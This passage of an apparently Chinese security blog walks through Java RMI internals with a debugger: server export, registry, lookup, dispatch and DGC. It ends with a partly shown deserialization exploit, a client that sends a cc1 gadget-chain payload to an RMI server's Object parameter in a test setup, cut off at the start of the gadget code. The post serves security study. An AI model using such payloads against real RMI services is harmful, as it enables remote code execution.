class="string">&quot;hey&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-9.png" title="客户端"></p><h3 id="3、实现"><a href="#3、实现" class="headerlink" title="3、实现"></a>3、实现</h3><p>客户端执行远程调用</p><p><img src="/posts/ad3be040/r-5.png" title="客户端远程调用"></p><p>服务端被调用执行</p><p><img src="/posts/ad3be040/r-6.png" title="服务端被调用"></p><h2 id="三、底层调试分析"><a href="#三、底层调试分析" class="headerlink" title="三、底层调试分析"></a>三、底层调试分析</h2><p>涉及相关知识点描述：</p><ul><li>TCPEndpoint：TCP端点，实现通讯的一个接口</li><li>ObjID：标识RMI运行时的远程对象，所有服务通过ObjID来调用</li><li>liveRef：将ObjID和TCPEndpoint进行封装起来连接使用</li><li>Target：封装远程对象的信息包括上述的信息</li></ul><h3 id="1、服务端创建"><a href="#1、服务端创建" class="headerlink" title="1、服务端创建"></a>1、服务端创建</h3><p>创建远程服务断点</p><p><img src="/posts/ad3be040/r-10.png" title="远程服务调试"></p><p>跟进远程调用类</p><p><img src="/posts/ad3be040/r-11.png" title="远程服务调试"></p><p>调用到父类<code>UnicastRemoteObject</code>的构造函数，端口为0（表示未设定端口，默认传入0，即后续会随机生成端口），继续跟进</p><p><img src="/posts/ad3be040/r-12.png" title="远程服务调试"></p><p>通过<code>exportObject</code>导出远程对象，将远程调用类和端口传入，继续跟进</p><p>此时通过<code>UnicastServerRef</code>处理端口信息，处理完后再次调用<code>exportObject</code>导出远程对象</p><p><img src="/posts/ad3be040/r-13.png" title="远程服务调试"></p><p>跟进<code>UnicastServerRef</code>方法，方法调用<code>LiveRef</code>类去处理port</p><p><img src="/posts/ad3be040/r-14.png" title="UnicastServerRef"></p><p>跟进<code>LiveRef</code>构造方法,通过<code>new objID()</code>生成一个对象id,然后调用带<code>LiveRef</code>类的参构造方法</p><p><img src="/posts/ad3be040/r-15.png" title="LiveRef"></p><p>继续跟进带参构造方法</p><p><img src="/posts/ad3be040/r-16.png" title="带参LiveRef"></p><p>通过调用<code>TCPEndpoint.getLocalEndpoint(port)</code>方法对端口进行处理</p><p><img src="/posts/ad3be040/r-17.png" title="TCPEndpoint.getLocalEndpoint"></p><p>跟进<code>getLocalEndpoint</code>方法，该方法经过TCP的相关属性建立，获取在本地地址中的TCP通信结点，端口为传进去的0，地址为本地ip地址。最后返回<code>TCPEndpoint</code>对象。</p><p><img src="/posts/ad3be040/r-18.png" title="TCPEndpoint.getLocalEndpoint"></p><p>再通过Liveref构造方法，将ep、id、islocal属性赋值。</p><p><img src="/posts/ad3be040/r-19.png" title="liveref"></p><p>创建了<code>liveref</code>过后，再将<code>liveref</code>传入<code>UnicastServerRef</code>的父类构造函数创建远程服务引用当中</p><p><img src="/posts/ad3be040/r-20.png" title="UnicastServerRef"></p><p>调用父类的构造函数，将<code>livefref</code>赋值给<code>ref</code>变量，可以看到<code>liveref</code>主要就是TCP连接的核心封装。</p><p><img src="/posts/ad3be040/r-21.png" title="ref"></p><p>获取了<code>ref</code>过后，再对<code>obj</code>对象（此时为服务端的远程调用对象）和<code>ref</code>进行<code>exportObject</code>导出对象操作</p><p><img src="/posts/ad3be040/r-22.png" title="exportObject"></p><p>过程中会判断<code>obj</code>对象是否属于<code>UnicastRemoteObject</code>类，属于则将<code>sref</code>赋值给<code>ref</code>，表示此时的<code>ref</code>为服务端的TCP结点信息，然后再调用<code>sref</code>的<code>exportObject</code>导出对象操作</p><p><img src="/posts/ad3be040/r-24.png" title="sref.exportObject"></p><p>进入<code>UnicastServerRef</code>的导出操作中，通过反射获取到远程调用类，再创建<code>stub</code>存根（服务端创建<code>stub</code>存根，发送给注册中心，客户端从注册中心拿到<code>stub</code>存根，使用stub存根跟远程服务器进行通信），并对<code>stub</code>创建动态代理，代理<code>handler</code>处理还是由<code>liveref</code>处理请求。</p><p><img src="/posts/ad3be040/r-23.png" title="stub"></p><p>最后将上面的信息通过<code>target</code>方法进行整合到一个对象上来，存放了<code>stub</code>、<code>impl远程服务对象</code>、<code>UnicastServerRef</code>等信息。</p><p><img src="/posts/ad3be040/r-25.png" title="target"><br><img src="/posts/ad3be040/r-26.png" title="target"></p><p>其中<code>UnicastServerRef</code>的通信对象和<code>stub</code>的通信对象为同一个<code>liveref</code>，表示引用同一个网络通信</p><p><img src="/posts/ad3be040/r-27.png" title="target"></p><p>创建好<code>target</code>后，最后再将<code>target</code>通过<code>exportObj</code>方法导出来</p><p><img src="/posts/ad3be040/r-28.png" title="target"></p><p>即调用<code>liveref</code>的<code>exportObj</code>，其中的<code>ep</code>为<code>TCPEndpoint</code>，再调用<code>TCPEndpoint.exportObj()</code></p><p><img src="/posts/ad3be040/r-29.png" title="exportObject"></p><p>再接着调用<code>TCPTransport.exportObj()</code></p><p><img src="/posts/ad3be040/r-30.png" title="exportObject"></p><p>通过<code>listen()</code>方法开启监听，开启网络socket通信</p><p><img src="/posts/ad3be040/r-31.png" title="listen"><br><img src="/posts/ad3be040/r-32.png" title="listen"></p><p>创建socket中，其中回对<code>listenport</code>监听端口进行判断，如果为0，则调用<code>server.getLocalPort()</code>方法</p><p><img src="/posts/ad3be040/r-33.png" title="listenport"></p><p>跟进<code>server.getLocalPort()</code>方法，调用<code>getImpl().getLocalPort()</code>，<code>getImpl()</code>获取<code>impl</code>对象（即图中的<code>DualStackPlainSocketlmpl</code>对象），然后再调用<code>getLocalPort()</code>获取<code>localport</code></p><p><img src="/posts/ad3be040/r-36.png" title="server.getLocalPort()"></p><p>此时的<code>impl</code>对象（<code>DualStackPlainSocketlmpl</code>）中已经存在<code>localport</code>，表明在此步骤前就已经生成了该<code>impl</code>对象的随机<code>localport</code>。</p><p><img src="/posts/ad3be040/r-37.png" title="localport"></p><p>往前追溯，发现<code>impl</code>对象的<code>localport</code>在<code>createServerSocket</code>创建服务<code>socket server</code>的时候生成的，接着跟，下面的图都是调用情况，直接跟进</p><p><img src="/posts/ad3be040/r-38.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-39.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-40.png" title="createServerSocket"><br><img src="/posts/ad3be040/r-44.png" title="ServerSocket"><br><img src="/posts/ad3be040/r-45.png" title="bind"><br><img src="/posts/ad3be040/r-46.png" title="bind"></p><p>一直到<code>PlainSocketlmpl.bind</code>方法，此时<code>impl</code>为<code>DualStackPlainSocketlmpl</code>对象，当前<code>localport</code>还没有赋值</p><p><img src="/posts/ad3be040/r-41.png" title="PlainSocketlmpl.bind"></p><p>继续跟进，到<code>AbstractPlainSocketlmpl.bind</code>方法，再跟进<code>socketBind</code>方法</p><p><img src="/posts/ad3be040/r-42.png" title="AbstractPlainSocketlmpl.bind"></p><p>在<code>socketBind</code>方法中通过<code>localPort0</code>方法生成的随机<code>localport</code>值</p><p><img src="/posts/ad3be040/r-43.png" title="localPort0"></p><p>回到主体来，判断<code>listenport</code>是否等于0，等于就将生成的随机<code>localport</code>赋值给监听端口，开启新线程等待连接后至此服务端已经将远程调用服务端口发布了出来</p><p><img src="/posts/ad3be040/r-33.png" title="listenport"></p><p>网络连接开始监听，开启新线程等待连接后至此服务端已经将远程调用服务端口发布了出来</p><p>最后调用父类<code>exportObj</code>方法将<code>target</code>发布</p><p><img src="/posts/ad3be040/r-47.png" title="exportObj"></p><p>这里的作用主要是讲发布的<code>target</code>对象相关数据（ref、stub、impl等信息）存放在<code>hashtable</code>中</p><p><img src="/posts/ad3be040/r-48.png" title="putTarget"><br><img src="/posts/ad3be040/r-49.png" title="put"></p><p>最后完成整个发布过程，开启监听等待连接。</p><p>引用一张su18大佬的服务器远程调用执行图</p><p><img src="/posts/ad3be040/r-50.png" title="执行图"></p><h3 id="2、注册中心创建"><a href="#2、注册中心创建" class="headerlink" title="2、注册中心创建"></a>2、注册中心创建</h3><p>注册中心绑定对象方法：bind、unbind、rebind<br>查询对象的方法：lookup、list</p><hr><p>在注册中心创建处下断点</p><p><img src="/posts/ad3be040/r-51.png" title="注册中心"></p><p>创建代理方法中返回的<code>new RegistryImpl</code>对象，将绑定端口传入</p><p><img src="/posts/ad3be040/r-52.png" title="new RegistryImpl"></p><p>跟进<code>RegistryImpl</code></p><p>先是判断注册端口是不是默认的1099和安全管理器（<code>System.getSecurityManager()</code>）是否开启，当前默认没有开启，因此会进入else代码段中</p><p><img src="/posts/ad3be040/r-53.png" title="RegistryImpl"></p><p>同服务器端创建一样，也创建了<code>liveRef</code>对象<code>lref</code>，端口为1099</p><p><img src="/posts/ad3be040/r-54.png" title="liveRef"><br><img src="/posts/ad3be040/r-55.png" title="liveRef"></p><p>然后通过<code>setup</code>方法将<code>lref</code>放入<code>UnicastServerRef</code>对象中然后传进<code>setup</code>方法中，当前环境的java版本（java-1.8.0_332）还将<code>RegistryImpl</code>对象进行注册表过滤</p><p><img src="/posts/ad3be040/r-56.png" title="liveRef"></p><p>调用父类构造方法也是将<code>liveRef</code>传给<code>Ref</code></p><p><img src="/posts/ad3be040/r-57.png" title="liveRef"></p><p>返回后，进入<code>setup</code>方法，作用效果跟服务器端创建差不多，也对<code>ref</code>进行导出，只不过加了个<code>permanent</code>表示永久性，服务器端创建的为临时性。</p><p><img src="/posts/ad3be040/r-58.png" title="setup"></p><p>导出方法相同，对<code>RegistryImpl</code>对象创建动态代理<code>stub</code>，不同的是创建代理中，由于<code>RegistryImpl</code>对象在jdk内置中存在<code>RegistryImpl_stub</code>，因此判断当前对象后缀_stub是否存在时，会返回true表示存在，进行判断体</p><p><img src="/posts/ad3be040/r-59.png" title="createProxy"><br><img src="/posts/ad3be040/r-70.png" title="bind"><br><img src="/posts/ad3be040/r-60.png" title="RegistryImpl_stub"></p><p>进入<code>createStub</code>方法，将<code>RegistryImpl</code>对象和<code>ref</code>传入，方法比较容易理解，将<code>ref</code>传入<code>RegistryImpl_stub</code>对象并且实例化</p><p><img src="/posts/ad3be040/r-61.png" title="RegistryImpl_stub"></p><p><code>RegistryImpl_stub</code>对象的存根<code>stub</code>就创建好了</p><p><img src="/posts/ad3be040/r-62.png" title="stub"></p><p>由于<code>RegistryImpl_stub</code>类是<code>RemoteStub</code>类的子类，因此会进入<code>setSkeleton</code>方法，传参为<code>RegistryImpl</code>对象</p><p><img src="/posts/ad3be040/r-63.png" title="RegistryImpl"></p><p>传入<code>RegistryImpl</code>调用<code>createSkeleton</code>方法，跟进</p><p>跟<code>stub</code>创建一样，都是反射调用自带对应后缀的方法，然后实例化<code>RegistryImpl_Skel</code></p><p><img src="/posts/ad3be040/r-64.png" title="RegistryImpl"></p><p>创建完后，将上面的所有信息依旧是放入<code>target</code>中，然后将<code>target</code>进行<code>exportObj</code>导出</p><p><img src="/posts/ad3be040/r-65.png" title="RegistryImpl"></p><p>经过同样步骤监听后面再将信息存入到<code>table</code>表中，步骤同服务器端创建一样</p><p><img src="/posts/ad3be040/r-66.png" title="put"><br><img src="/posts/ad3be040/r-67.png" title="table"></p><p>到此注册中心创建完成</p><p>再查看绑定过程</p><p><img src="/posts/ad3be040/r-68.png" title="bind"></p><p>绑定过程比较简单，将<code>obj</code>对象和绑定名称放入<code>bindings</code>的<code>hashtable</code>表中进行存储</p><p><img src="/posts/ad3be040/r-69.png" title="bind"></p><p>到这里，注册中心的创建和绑定就完成</p><h3 id="3、客户端调用注册中心"><a href="#3、客户端调用注册中心" class="headerlink" title="3、客户端调用注册中心"></a>3、客户端调用注册中心</h3><p>连接注册中心下断点</p><p><img src="/posts/ad3be040/r-71.png" title="连接注册中心"></p><p>跟进<code>getRegistry</code>函数</p><p><img src="/posts/ad3be040/r-72.png" title="连接注册中心"></p><p>在客户端本地生成了<code>liveRef</code>，将<code>ObjID</code>和<code>TCPEndpoint</code>进行封装，<code>host</code>、<code>port</code>为输入指定的</p><p><img src="/posts/ad3be040/r-73.png" title="liveRef"></p><p>然后将<code>liveRef</code>传入<code>UnicastRef</code>方法中，最后传递给<code>ref</code>对象，相当于再进行了一层封装</p><p>返回中调用<code>createProxy</code>创建注册代理，跟进<code>createProxy</code></p><p><img src="/posts/ad3be040/r-74.png" title="createProxy"></p><p>这里跟注册中心创建<code>stub</code>的步骤一样，通过反射调用实例化<code>RegistryImpl_Stub</code>创建的<code>stub</code></p><p><img src="/posts/ad3be040/r-75.png" title="RegistryImpl_Stub"></p><p>到这<code>Registry</code>对象获取完成，接下来就是在注册中心<code>lookup</code>查找远程对象名</p><p><img src="/posts/ad3be040/r-76.png" title="lookup"></p><p>跟进<code>lookup</code>方法，先是通过<code>newCall</code>方法对代理<code>stub</code>获取远程连接，然后对远程连接流写入，写入对象为传进来的远程对象名称（目的是通过序列化传给注册中心我要查找的远程对象名是什么，注册中心再通过反序列化读取客户端传过来的数据）</p><p><img src="/posts/ad3be040/r-77.png" title="序列化写入"></p><p>写入过后，对<code>call</code>对象执行<code>invoke</code>方法操作，跟进</p><p><img src="/posts/ad3be040/r-78.png" title="invoke"></p><p>调用<code>call.executeCall()</code>方法，<code>executeCall</code>方法客户端对远程调用通信处理的核心，对获取的数据进行读取，包括读取远程对象的<code>liveRef</code>的<code>ObjID</code></p><p><img src="/posts/ad3be040/r-79.png" title="invoke"><br><img src="/posts/ad3be040/r-80.png" title="executeCall"></p><p>再将<code>call</code>通信中获取到的数据进行反序列化读取</p><p><img src="/posts/ad3be040/r-81.png" title="readObject"></p><p>读取后就获取到远程对象的动态代理<code>stub</code>信息了（ObjID、port、liveref等等）</p><p><img src="/posts/ad3be040/r-82.png" title="readObject"></p><p>完成获取后，就能直接跟服务器端远程通信了</p><h3 id="4、注册中心处理客户端调用"><a href="#4、注册中心处理客户端调用" class="headerlink" title="4、注册中心处理客户端调用"></a>4、注册中心处理客户端调用</h3><p>第三部分学习分析的客户端角度的调用，接着看注册中心对客户端的处理，这里重点在连接监听开启后创建的线程中的TCPTransport.run方法，run方法调用run0方法，run0方法调用核心信息读取handleMessages方法</p><p>直接从监听中线程开启运行<code>run</code>方法中分析学习</p><p><img src="/posts/ad3be040/r-105.png" title="run"></p><p><code>run</code>方法调用<code>run0</code>方法</p><p><img src="/posts/ad3be040/r-106.png" title="run0"></p><p>run0调用主要的读取信息的方法<code>handleMessages</code></p><p><img src="/posts/ad3be040/r-107.png" title="handleMessages"></p><p>在<code>handleMessages</code>方法中下断点，然后在客户端进行请求，服务器端注册中心会抓到断点信息，这里获取到<code>connection</code>连接信息，获取TCP连接读取流，然后传递给<code>op</code>对象</p><p><img src="/posts/ad3be040/r-108.png" title="handleMessages"></p><p>根据<code>op</code>值选择条件分支，对<code>conn</code>连接信息创建远程调用对象<code>call</code>，再调用<code>serviceCall</code>方法</p><p><img src="/posts/ad3be040/r-109.png" title="serviceCall"></p><p>通过<code>id</code>和<code>transport</code>，在<code>target</code>表中获取到远程对象（客户端）的<code>target</code>信息</p><p><img src="/posts/ad3be040/r-110.png" title="target"></p><p>从远程<code>target</code>对象获取他的<code>disp(UnicastServerRef)</code>后，对其调用<code>dispatch</code>方法</p><p><img src="/posts/ad3be040/r-111.png" title="dispatch"></p><p>进入<code>dispatch</code>方法后，先是获取读取流，然后判断<code>skel</code>是否存在（用来判断是服务端还是注册中心，注册中心存在<code>skel</code>）</p><p><img src="/posts/ad3be040/r-112.png" title="dispatch"></p><p>由于是注册中心，因此对进入调用<code>oldDispatch</code>方法（由于java版本不同，方法名和代码会有差别，但大体差不多，除了加的一些防御方法），继续跟进<code>oldDispatch</code>方法</p><p>在该方法最后，调用<code>skel.dispatch</code>方法</p><p><img src="/posts/ad3be040/r-113.png" title="skel.dispatch"></p><p>核心处理就在<code>skel.dispatch</code>方法当中，对不同的端进行不同的处理</p><p><img src="/posts/ad3be040/r-114.png" title="skel.dispatch"></p><ul><li>0表示调用的bind方法</li><li>1表示调用的list方法</li><li>2表示调用的lookup方法</li><li>3表示调用rebind方法</li><li>4表示调用unrebind方法</li></ul><p>由于是客户端发起的，通过<code>lookup</code>调用查询远程对象名，因此会进入2分支</p><p><img src="/posts/ad3be040/r-115.png" title="lookup分支"></p><p>相关流程注释出来了（低版本则是直接<code>readObject</code>反序列化对象，这里只是反序列化字符串）</p><p><img src="/posts/ad3be040/r-116.png" title="lookup分支"></p><p>可以看到<code>result</code>已经获取到远程调用对象的liveref<br><code>result</code>从<code>lookup</code>方法中获取，<code>impl</code>的<code>lookup</code>方法也是从<code>bindings</code>的<code>hashtable</code>中获取远程对象名，返回给<code>result</code></p><p><img src="/posts/ad3be040/r-118.png" title="result"><br><img src="/posts/ad3be040/r-117.png" title="序列化写入"></p><p>注册器处理客户端的大体的流程就到这完成</p><h3 id="5、注册中心处理服务端调用"><a href="#5、注册中心处理服务端调用" class="headerlink" title="5、注册中心处理服务端调用"></a>5、注册中心处理服务端调用</h3><p>这里注册中心处理方法大体跟步骤4处理客户端的相同,不重复分析了，只是最后走进的分支不同，<code>bind</code>走进0分支</p><p>注:不同的是这实现的步骤是基于服务端和注册端不在一起的情况下，在一起的情况下，服务端<code>bind</code>直接就对注册中心的<code>bind</code>的<code>hashtable</code>进行<code>put</code>了</p><p><img src="/posts/ad3be040/r-119.png" title="bind"></p><h3 id="6、客户端调用远程服务器方法"><a href="#6、客户端调用远程服务器方法" class="headerlink" title="6、客户端调用远程服务器方法"></a>6、客户端调用远程服务器方法</h3><p>调用处下断点</p><p><img src="/posts/ad3be040/r-83.png" title="远程方法调用断点"></p><p>跟进会进入到<code>invoke</code>方法（在分析cc1-Lazymap链的时候提到，动态代理对象在调用方法的时候会先进入到动态代理类的<code>invoke</code>方法中，可起到拦截过滤的作用），因为当前对象<code>RMIObject</code>是一个动态代理对象，因此跟进会先进入对应代理类的<code>Invoke</code>方法中</p><p><img src="/posts/ad3be040/r-85.png" title="远程代理类"></p><p>跟进<code>invoke</code>方法，前面对代理类和方法归属类做一些判断，然后调用<code>invokeRemoteMethod</code>方法，参数为代理、方法名、参数</p><p><img src="/posts/ad3be040/r-84.png" title="invoke"></p><p>继续跟进<code>invokeRemoteMethod</code>方法，前面判断代理是否实现<code>Remote</code>远程类，再判断<code>Method</code>的归属类是否是<code>Remote</code>的子类，不满足的话会抛出异常，满足会进入<code>UnicastRef.invoke</code>方法</p><p><img src="/posts/ad3be040/r-86.png" title="invokeRemoteMethod"></p><p>跟进<code>UnicastRef.invoke</code>方法，先是创建<code>liveref</code>的连接<code>connection</code></p><p><img src="/posts/ad3be040/r-87.png" title="连接创建"></p><p>再创建连接<code>connection</code>的远程连接流<code>call</code></p><p><img src="/posts/ad3be040/r-88.png" title="call创建"></p><p>接下来对参数列表进行判断后序列化写入</p><p><img src="/posts/ad3be040/r-89.png" title="参数序列化写入"><br><img src="/posts/ad3be040/r-90.png" title="参数序列化写入"></p><p>上面完成后，对<code>call</code>流进行执行操作</p><p><img src="/posts/ad3be040/r-91.png" title="executeCall"></p><p>其中<code>releaseOutputStream</code>方法是向对服务器远程调用序列化传输数据</p><p><img src="/posts/ad3be040/r-92.png" title="releaseOutputStream"></p><p>跟进，<code>out</code>为写入流且存在，因此会调用<code>flush()</code>方法</p><p><img src="/posts/ad3be040/r-93.png" title="flush"></p><p>跟进<code>flush</code>方法，会再次调用<code>flush</code>方法</p><p><img src="/posts/ad3be040/r-94.png" title="flush"></p><p>其中<code>drain</code>方法由于<code>pos</code>为0，因此会直接返回</p><p><img src="/posts/ad3be040/r-95.png" title="drain"><br><img src="/posts/ad3be040/r-96.png" title="drain"></p><p>进入到<code>BufferedOutputStream.flush()</code>方法中</p><p><img src="/posts/ad3be040/r-97.png" title="BufferedOutputStream.flush()"><br><img src="/posts/ad3be040/r-98.png" title="BufferedOutputStream.flush()"></p><p>继续跟进<code>flushBuffer()</code>方法，在该方法中，对数据进行序列化写入</p><p><img src="/posts/ad3be040/r-99.png" title="write"></p><p>同时，服务器端进行反序列化解析数据读取客户端传过来的数据，并执行方法</p><p><img src="/posts/ad3be040/r-100.png" title="服务器端执行方法"></p><p>执行后，客户端对写入流进行释放，写入执行过程就差不多结束</p><p>由于调用方法的返回类型为<code>String</code>返回的字符串，因此会进行反序列化读取返回来的字符串的操作</p><p><img src="/posts/ad3be040/r-101.png" title="反序列化读取"></p><p>获取<code>call</code>的读取流，然后通过<code>unmarshalValue</code>方法根据返回类型进行反序列化读取数据（这里会涉及到服务器返回恶意序列化数据然后客户端本地反序列化读取导致被攻击）</p><p><img src="/posts/ad3be040/r-102.png" title="unmarshalValue"><br><img src="/posts/ad3be040/r-103.png" title="unmarshalValue"></p><p>反序列化获取数据后，最后释放掉连接，然后返回获取的字符串</p><p><img src="/posts/ad3be040/r-104.png" title="unmarshalValue"></p><p>至此主要执行过程结束</p><h3 id="7、服务端处理客户端远程调用"><a href="#7、服务端处理客户端远程调用" class="headerlink" title="7、服务端处理客户端远程调用"></a>7、服务端处理客户端远程调用</h3><p>这里的起始分析位置跟步骤四相同，都是通过开启监听后，创建线程连接调用的<code>TCPTransport.run</code>方法引入的，直接通过（方法调用情况：<code>TCPTransport.run-&gt;run0-&gt;handleMessages-&gt;serviceCall-&gt;disp.dispatch-&gt;UnicastServerRef.dispatch</code>）到重点部分</p><p>步骤4中提到<code>skel</code>是否为<code>null</code>是判断是服务端处理还是注册器端处理，注册器端处理过后返回给客户端后，客户端直接跟服务端进行通信，序列化数据传输过来后，服务端开始处理，此时服务端并没有<code>skel</code>，因此会跳过该判断</p><p><img src="/posts/ad3be040/r-120.png" title="dispatch"></p><p>然后从读取流中读取方法名</p><p><img src="/posts/ad3be040/r-121.png" title="method"></p><p>获取到方法名后，通过<code>unmarshalParameters</code>方法将参数进行反序列化读取出来，前面分析过该方法了，就不分析了</p><p><img src="/posts/ad3be040/r-123.png" title="反序列化参数"><br><img src="/posts/ad3be040/r-122.png" title="反序列化参数"></p><p>读取过后，释放掉读取流，然后通过反射执行方法，得到方法的返回值</p><p><img src="/posts/ad3be040/r-124.png" title="反射执行方法"><br><img src="/posts/ad3be040/r-125.png" title="反射执行方法"></p><p>最后再将返回值通过<code>marshalValue</code>方法序列化写入传递给客户端</p><p><img src="/posts/ad3be040/r-126.png" title="序列化写入"><br><img src="/posts/ad3be040/r-127.png" title="序列化写入"></p><p>写入完，释放掉读取流、输入流，就完成了服务端对客户端数据的处理过程</p><h3 id="8、DGC创建"><a href="#8、DGC创建" class="headerlink" title="8、DGC创建"></a>8、DGC创建</h3><p>DGC全名（Distributed Garbage Collection），是一种分布式垃圾回收机制，用来回收不用的远程对象，注册中心的创建过程中会创建DGC</p><p>跟进GDC创建，前面的分析在创建注册中心分析过了，直接到创建的关键步骤（<code>putTarget</code>）</p><p>前文提到在创建过程会创建注册中心<code>stub、skel</code>等信息最终放到<code>target</code>里面，最后将<code>target</code>放到<code>objtable</code>里</p><p>在最后一步<code>putTarget</code>中，会调用<code>DGCImpl</code></p><p><img src="/posts/ad3be040/r-131.png" title="DGCImpl创建"></p><p>DGC调用了一个静态方法<code>dgcLog</code>，在调用静态方法的时候会通过调用静态函数进行实例化DGC对象</p><p><img src="/posts/ad3be040/r-132.png" title="DGCImpl创建"></p><p>DGC的静态方法中完成了对DGC的<code>disp、stub、skel</code>的创建，创建过程和注册中心的创建类似，不再重复分析，创建完后最后放进<code>objtable</code>表中</p><p><img src="/posts/ad3be040/r-133.png" title="DGCImpl创建"><br><img src="/posts/ad3be040/r-134.png" title="DGCImpl创建"></p><p>同注册中心一样，<code>DGCImpl</code>也存在自己的<code>stub</code>和<code>skel</code>，执行位置也很相似，<code>skel</code>监听线程中通过<code>dispatch</code>方法执行分支<br><code>DGCImpl_Stub</code>主要实现两个功能：<code>clean</code>、<code>dirty</code></p><p><code>clean</code>的作用是清除回收远程连接对象，创建<code>call</code>连接流，将<code>ObjId</code>、<code>长度</code>等序列化写入，然后调用<code>invoke</code>方法</p><p><img src="/posts/ad3be040/r-135.png" title="clean"></p><p>在调用<code>invoke</code>方法时，在客户端调用注册中心的时候说过会最后执行<code>executeCall</code>方法对数据进行反序列化读取</p><p><img src="/posts/ad3be040/r-80.png" title="executeCall"></p><p><code>dirty</code>方法的作用是客户端调用服务器远程引用时，使用<code>dirty</code>来注册一个临时的远程引用，后续还想使用该远程引用，就再次使用<code>dirty</code>方法去续租<br>同样该方法也会调用<code>invoke</code>反序列化读取信息</p><p><img src="/posts/ad3be040/r-136.png" title="dirty"></p><p>然后DGC服务端的主要方法<code>dispatch</code>，可以看到和注册中心的执行模式非常相似</p><p>也主要有两个分支分别针对<code>clean</code>和<code>dirty</code></p><p><img src="/posts/ad3be040/r-137.png" title="dispatch"><br><img src="/posts/ad3be040/r-138.png" title="dispatch"></p><p>针对不同的方法调用都显示反序列化获取<code>stub</code>客户端先写入的信息<code>ObjId</code>、<code>租赁信息</code>等，最后再通过<code>DGCImpl</code>的<code>clean/dirty</code>方法对远程引用进行清除和租赁。</p><p>由于<code>Skel/stub</code>都存在反序列化点，因此针对该DGC的攻击被称为JRMP攻击。</p><h2 id="四、流程总结"><a href="#四、流程总结" class="headerlink" title="四、流程总结"></a>四、流程总结</h2><p>直接引用java安全rmi文章总结，写的很清晰了</p><p>RMI底层通讯采用了Stub(运行在客户端)和Skeleton(运行在服务端)机制，RMI调用远程方法的大致如下：</p><ol><li><p>RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)。</p></li><li><p>Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象。</p></li><li><p>RemoteCall序列化RMI服务名称、Remote对象。</p></li><li><p>RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式（传输层）传输到RMI服务端的远程引用层。</p></li><li><p>RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel.dispatch)。</p></li><li><p>Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。</p></li><li><p>Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端。</p></li><li><p>RMI客户端反序列化服务端结果，获取远程对象的引用。</p></li><li><p>RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端</p></li><li><p>RMI客户端反序列化RMI远程方法调用结果。</p></li></ol><h2 id="五、RMI利用"><a href="#五、RMI利用" class="headerlink" title="五、RMI利用"></a>五、RMI利用</h2><h3 id="1、攻击服务端Server"><a href="#1、攻击服务端Server" class="headerlink" title="1、攻击服务端Server"></a>1、攻击服务端Server</h3><p>客户端通过注册中心获取到通信服务器端的stub，客户端直接向服务端进行通信，服务端通过获取客户端的参数进行反序列化结合组件触发漏洞</p><p>示例环境：java版本8u66，服务器使用cc3.1组件，服务端存在Object参数传入</p><p>RMIObject:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">helloObj</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIObjectImpl:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">helloObj</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用obj输出：&quot;</span>+obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用cc1链对象传入</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RMIObject</span> <span class="variable">rc</span> <span class="operator">=</span> (RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        rc.helloObj(payload());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">payload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span 